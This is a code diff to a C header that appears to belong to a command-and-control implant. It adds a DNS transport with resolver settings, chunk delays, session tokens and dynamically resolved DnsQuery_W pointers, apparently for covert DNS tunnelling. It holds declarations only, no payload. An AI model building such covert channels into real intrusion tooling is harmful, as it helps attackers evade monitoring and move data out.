@@ -121,6 +121,19 @@ typedef struct
             LPWSTR  Name;   /* UTF-16 pipe name; teamserver sends via AddWString in builder.go */
             HANDLE  Handle;
 #endif
+
+#ifdef TRANSPORT_DNS
+            struct {
+                LPWSTR  ZoneDomain;
+                DWORD   ResolverCount;
+                LPWSTR  Resolvers[ 8 ];
+                WORD    Port;
+                DWORD   QueryTimeout;
+                DWORD   ChunkDelayMs;
+                UINT16  SeqNum;        /* rolling sequence counter */
+                UINT32  SessionToken;  /* random per-session id, not the agent ID */
+            } DnsCtx;
+#endif
         } Transport;
 
         struct _CONFIG {
@@ -304,6 +317,12 @@ typedef struct
         WIN_FUNC( WinHttpQueryHeaders )
         WIN_FUNC( WinHttpGetIEProxyConfigForCurrentUser )
         WIN_FUNC( WinHttpGetProxyForUrl )
+
+        /* dnsapi.dll — loaded only when TRANSPORT_DNS */
+#ifdef TRANSPORT_DNS
+        DNS_STATUS ( WINAPI *DnsQuery_W )( PCWSTR pszName, WORD wType, DWORD Options, PVOID pExtra, PDNS_RECORD *ppQueryResults, PVOID *pReserved );
+        VOID       ( WINAPI *DnsRecordListFree )( PDNS_RECORD pRecordList, DNS_FREE_TYPE FreeType );
+#endif
 
         // Mscoree
         HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
@@ -533,6 +552,10 @@ typedef struct
 
 #ifdef TRANSPORT_HTTP
         PVOID WinHttp;
+#endif
+
+#ifdef TRANSPORT_DNS
+        PVOID DnsApi;
 #endif
     } Modules;
 
